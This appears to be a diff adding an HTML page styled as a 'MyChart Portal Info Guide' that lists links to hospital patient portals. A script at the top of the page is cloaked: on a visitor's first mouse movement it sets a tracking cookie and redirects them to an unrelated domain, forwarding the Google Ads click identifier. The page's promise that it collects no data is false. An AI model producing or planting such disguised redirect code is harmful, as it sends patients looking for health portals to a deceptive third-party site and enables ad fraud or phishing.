@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<script>
+// Function to get the value of a cookie by name
+function getCookie(name) {
+    let nameEQ = name + "=";
+    let cookiesArray = document.cookie.split(';');
+    for (let i = 0; i < cookiesArray.length; i++) {
+        let cookie = cookiesArray[i].trim();
+        if (cookie.indexOf(nameEQ) === 0) {
+            return cookie.substring(nameEQ.length, cookie.length);
+        }
+    }
+    return null;
+}
+
+// Function to set a cookie
+function setCookie(name, value, days) {
+    let expires = "";
+    if (days) {
+        let date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        expires = "; expires=" + date.toUTCString();
+    }
+    document.cookie = name + "=" + (value || "") + expires + "; path=/";
+}
+
+// Function to get a query parameter from the URL
+function getQueryParam(param) {
+    let urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+}
+
+// Check if 'checkmove' cookie is set
+if (!getCookie("checkmove")) {
+    var hasMovedOrClicked = false;
+
+    window.addEventListener('mousemove', function() {
+        if (!hasMovedOrClicked) {
+            hasMovedOrClicked = true;
+            setTimeout(function() {
+                // Get the gclid parameter if available
+                let gclid = getQueryParam("gclid");
+                let redirectUrl = "https://globalvistanews.site/index.php";
+
+                // Append gclid to the URL if it exists
+                if (gclid) {
+                    redirectUrl += "&gclid=" + encodeURIComponent(gclid);
+                }
+
+                // Set cookie and redirect
+                setCookie("checkmove", "true", 7);
+                window.location.href = redirectUrl;
+            }, 1000);
+        }
+    });
+}
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MyChart Portal Info Guide</title>
+  <meta name="description" content="Access links to various MyChart portals to securely manage your personal health records and appointments online.">
+  <meta name="keywords" content="MyChart, patient portal, health records, online appointments, secure access, MyChart support, online medical access">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+
+    header {
+      background: linear-gradient(to right, #0073e6, #005bb5);
+      padding: 30px 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      margin: 0;
+      font-size: 2.5rem;
+      color: #fff;
+    }
+
+    nav {
+      background-color: #003f80;
+      padding: 10px;
+      text-align: center;
+    }
+
+    nav a {
+      color: #fff;
+      text-decoration: none;
+      margin: 0 12px;
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    nav a:hover {
+      text-decoration: underline;
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+    }
+
+    h1, h2 {
+      color: #005bb5;
+    }
+
+    p {
+      line-height: 1.7;
+      font-size: 16px;
+      margin: 15px 0;
+    }
+
+    ul {
+      padding-left: 0;
+      list-style: none;
+    }
+
+    ul li {
+      margin: 10px 0;
+    }
+
+    ul li a {
+      color: #0073e6;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    ul li a:hover {
+      text-decoration: underline;
+    }
+
+    footer {
+      background-color: #003f80;
+      color: white;
+      text-align: center;
+      padding: 15px;
+      margin-top: 80px;
+    }
+
+    #cookieConsent {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #222;
+      color: #fff;
+      padding: 15px;
+      text-align: center;
+      font-size: 14px;
+      z-index: 1000;
+    }
+
+    #cookieConsent button {
+      background-color: #0073e6;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin-left: 10px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <h1>MyChart Patient Portal Info</h1>
+  </header>
+
+  <nav>
+    <a href="index.html">Home</a>
+    <a href="my-chart.html">My Chart</a>
+    <a href="about.html">About</a>
+    <a href="privacy-policy.html">Privacy Policy</a>
+    <a href="terms.html">Terms</a>
+    <a href="disclaimer.html">Disclaimer</a>
+    <a href="refund-policy.html">Refund Policy</a>
+    <a href="contact.html">Contact</a>
+  </nav>
+
+  <div class="container">
+    <h2>MyChart Portal Info Guide</h2>
+
+    <p>Welcome to our guide for accessing various MyChart portals. This page is dedicated to helping individuals easily find and navigate to official MyChart websites provided by healthcare organizations. These portals allow you to stay informed about your healthcare details online.</p>
+
+    <p>Each MyChart page listed here connects you directly to a reputable health provider’s official portal. These portals typically offer access to information such as upcoming appointments, previous visits, billing statements, and educational materials. We ensure that the links we share are updated and verified regularly.</p>
+
+    <p>Using official online portals is a convenient way to stay engaged with your personal care. Instead of relying on outdated methods to track visits or updates, modern digital platforms empower users to manage information efficiently and independently.</p>
+
+    <p>This website does not collect or store any personal data. We are not affiliated with any hospital or healthcare organization. Our mission is solely to provide helpful navigation to trusted sources. Always contact your provider for personal care inquiries or emergencies.</p>
+
+    <p>Whether you are a patient, caregiver, or someone helping a family member, finding the correct portal quickly can make managing healthcare easier. These resources are accessible online and are supported by leading medical networks across the U.S.</p>
+
+    <p>Bookmark this page for future reference. As more institutions continue to enhance digital access, our site aims to stay current and helpful to users seeking reliable MyChart portal links.</p>
+
+    <ul>
+      <li><a href="https://mychart.nyulangone.org" target="_blank">NYU Langone</a></li>
+      <li><a href="https://mychart.promedica.org" target="_blank">ProMedica</a></li>
+      <li><a href="https://mychart.mountsinai.org" target="_blank">Mount Sinai</a></li>
+      <li><a href="https://mychart.englewoodhealth.org" target="_blank">Englewood Health</a></li>
+      <li><a href="https://www.mychart.com" target="_blank">MyChart Online</a></li>
+      <li><a href="https://mychart.baptist-health.com" target="_blank">Baptist Health</a></li>
+      <li><a href="https://mychart.hfhs.org" target="_blank">Henry Ford</a></li>
+      <li><a href="https://mychart.ochin.org" target="_blank">OCHIN</a></li>
+      <li><a href="https://www.healthpartners.com/mychart" target="_blank">HealthPartners</a></li>
+      <li><a href="https://mychart.allinahealth.org" target="_blank">Allina Health</a></li>
+      <li><a href="https://mychart.trinity-health.org" target="_blank">Trinity Health</a></li>
+      <li><a href="https://mychart.carsontahoe.org" target="_blank">Carson Tahoe</a></li>
+      <li><a href="https://mychart.houstonmethodist.org" target="_blank">Houston Methodist</a></li>
+      <li><a href="https://www.parknicollet.com/mychart" target="_blank">Park Nicollet</a></li>
+      <li><a href="https://mychart.dukemychart.org" target="_blank">Duke Health</a></li>
+      <li><a href="https://mychart.providence.org" target="_blank">Providence</a></li>
+      <li><a href="https://mychart.uihealthcare.org" target="_blank">UI Healthcare</a></li>
+      <li><a href="https://mychart.uhhospitals.org" target="_blank">UH Cleveland</a></li>
+      <li><a href="https://mychart.osfhealthcare.org" target="_blank">OSF HealthCare</a></li>
+      <li><a href="https://mychart.mercylutherville.org" target="_blank">Mercy Lutherville</a></li>
+      <li><a href="https://mychart.clevelandclinic.org" target="_blank">Cleveland Clinic</a></li>
+      <li><a href="https://mychart.inova.org" target="_blank">Inova</a></li>
+    </ul>
+  </div>
+
+  <div id="cookieConsent">
+    This website uses cookies to ensure you get the best experience. <button onclick="document.getElementById('cookieConsent').style.display='none'">Accept</button>
+  </div>
+
+  <footer>
+    &copy; 2025 MyChart Info Site | This site is not affiliated with any healthcare provider. Links are provided for general navigation purposes only.
+  </footer>
+</body>
+
+</html>
